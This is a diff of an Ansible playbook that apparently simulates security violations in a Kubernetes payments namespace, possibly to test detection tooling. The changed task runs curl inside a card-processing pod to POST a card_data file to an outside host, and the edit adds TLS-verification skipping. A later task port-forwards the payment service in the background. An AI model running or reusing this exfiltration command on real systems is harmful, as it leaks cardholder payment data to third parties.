@@ -59,7 +59,7 @@
     namespace: payments
     pod: "{{ lookup('community.kubernetes.k8s', kind='Pod', namespace='payments', label_selector='app=mastercard-processor', kubeconfig=kubeconfig).metadata.name }}"
     kubeconfig: "{{ kubeconfig }}"
-    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
+    command: 'curl -k -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
 
 - name: k8s_portforward violation
   shell: "{{ orchestrator_tool }} -n payments port-forward service/mastercard-processor-service 30000:8080 1>/dev/null 2>&1 &"
